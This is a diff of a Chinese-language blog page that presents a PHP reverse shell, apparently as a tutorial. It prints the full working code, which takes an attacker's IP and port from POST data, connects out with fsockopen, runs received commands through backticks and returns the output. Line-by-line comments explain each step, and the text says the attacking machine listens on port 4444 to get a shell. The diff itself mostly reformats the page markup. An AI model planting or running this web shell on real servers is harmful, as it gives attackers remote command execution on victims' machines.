@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya1r001hs04z3pxe68ud" class="article article-type-post" itemscope
+    <article id="post-ckwrjlygd001iys4z7fgx7t7p" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -181,7 +181,23 @@
 <span id="more"></span>
 
 <p>1、划线为攻击机的IP+端口。<br><img src="https://img-blog.csdnimg.cn/20190926184123526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、攻击机监听自身端口4444，即可获取执行shell。<br><img src="https://img-blog.csdnimg.cn/20190926184410575.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0); </span><br><span class="line">$ip=$_POST[&#x27;ip&#x27;];</span><br><span class="line">$port=$_POST[&#x27;port&#x27;];</span><br><span class="line">$fp=@fsockopen($ip,$port,$errno,$errstr);</span><br><span class="line">if(!$fp)&#123;echo &quot;error&quot;;&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	fputs($fp,&quot;\n+++++++++++++connect sucess+++++++++\n&quot;);</span><br><span class="line">	while(!feof($fp))&#123;</span><br><span class="line">	fputs($fp,&quot;shell:&quot;);</span><br><span class="line">	$shell=fgets($fp);</span><br><span class="line">	$message=`$shell`;</span><br><span class="line">	fputs($fp,$message);</span><br><span class="line">	&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">&lt;?php 
+set_time_limit(0); 
+$ip=$_POST[&#x27;ip&#x27;];
+$port=$_POST[&#x27;port&#x27;];
+$fp=@fsockopen($ip,$port,$errno,$errstr);
+if(!$fp)&#123;echo &quot;error&quot;;&#125;
+else&#123;
+	fputs($fp,&quot;\n+++++++++++++connect sucess+++++++++\n&quot;);
+	while(!feof($fp))&#123;
+	fputs($fp,&quot;shell:&quot;);
+	$shell=fgets($fp);
+	$message=`$shell`;
+	fputs($fp,$message);
+	&#125;
+fclose($fp);
+&#125;
+?&gt;</code></pre>
 <p><strong>代码注释：</strong><br>1、<code>set_time_limit()</code>来控制运行时间。如 <code>set_time_limit(800)</code>  ,其中将秒数如果设为0 ，表示持续运行到程序结束。<br>2、<code>$_POST[&#39;ip&#39;]</code> <code>$_POST[&#39;port&#39;]</code>表示传递的攻击的IP，PORT。<br>3、<code>$fp=@fsockopen($ip,$port,$errno,$errstr);</code> fsockopen — 打开一个网络连接或者一个Unix套接字连接，并且使用<code>@</code>屏蔽报错信息，返回一个文件句柄<code>$fp</code>，可以被其他文件类函数调用，例如代码中的<code>fputs(),fgets()</code>。<br>4、判断<code>$fp</code>是否存在，不存在报错<code>echo &quot;error&quot;</code>，存在就使用<code>fputs()</code>函数写入连接成功信息。<br>5、<code>feof()</code> 函数检查是否已到达文件末尾（EOF）。如果出错或者文件指针到了文件末尾（EOF）则返回 TRUE，否则返回 FALSE。使用while在不到读取的文件末尾时一直执行。<br>6、<code>fputs($fp,&quot;shell:&quot;);</code>向句柄输出shell:的提示<br>7、<code>$shell=fgets($fp);</code>将攻击机输入命令通过文件句柄<code>$fp</code>传递入受害机器，同时使用<code>fget()</code>函数读取输入的命令，最终传递给<code>$shell</code>变量存储。<br>8、<code>$message=`$shell`;</code>php默认将反单引号的内容作为系统命令执行。<br>9、<code>fputs($fp,$message);</code>将结果输出至攻击机端显示。<br>10、<code>fclose($fp);</code>关闭文件句柄。</p>
 
         </div>
